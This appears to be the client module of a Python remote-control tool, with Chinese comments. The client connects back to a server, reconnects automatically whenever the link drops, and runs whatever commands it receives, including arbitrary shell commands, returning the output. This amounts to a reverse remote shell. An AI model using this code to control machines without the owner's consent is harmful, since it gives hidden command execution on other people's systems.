import inspect
import os
import sys
import time

from entity.server import Server
from util.command import Command
from util.parser import parse


class Client:
    def __init__(self):
        # 服务端地址
        self.address = ('127.0.0.1', 9999)
        # 服务端套接字
        self.server = Server()

    # 连接服务端
    def connect(self):
        # 连接失败等待5秒后重新连接
        while not self.server.connect(self.address):
            time.sleep(5)

    # 等待命令
    def wait(self):
        while True:
            try:
                # 接收服务端发送的命令并交给回调函数执行
                self.server.recv_command(self.command_handler)
                # 向服务端发送当前工作目录的路径
                self.server.send_result(1, os.getcwd())
            # 连接断开
            except ConnectionResetError:
                # 关闭套接字
                self.server.close()
                # 重新创建套接字
                self.server = Server()
                # 重新连接
                self.connect()
            except Exception as e:
                print(e)

    # 执行命令的回调函数
    def command_handler(self, command):
        try:
            # 关闭连接
            if command == 'kill':
                self.server.close()
                sys.exit(0)
            # 将收到的命令拆分成命令名和参数
            name, arg = parse(command)
            cmd = Command()
            if hasattr(cmd, name):
                # 通过命令名获取函数
                func = getattr(cmd, name)
                # 获取函数的参数
                args = inspect.getfullargspec(func).args
                # 获取函数的参数个数
                argc = len(args)
                # 如果函数没有参数
                if not argc:
                    # 调用函数并发送命令执行结果
                    self.server.send_result(*func())
                # 如果函数需要传入服务端套接字
                elif 'server' in args:
                    # 函数只需要传入服务端套接字
                    if argc == 1:
                        func(self.server)
                    # 函数需要传入服务端套接字和命令参数
                    else:
                        func(self.server, arg)
                # 如果函数有参数但不是服务端套接字
                else:
                    # 将命令参数传给该函数，调用函数并发送命令执行结果
                    self.server.send_result(*func(arg))
            else:
                # 执行shell命令
                self.server.send_result(*cmd.shell(command))
        except Exception as e:
            self.server.send_result(0, str(e))
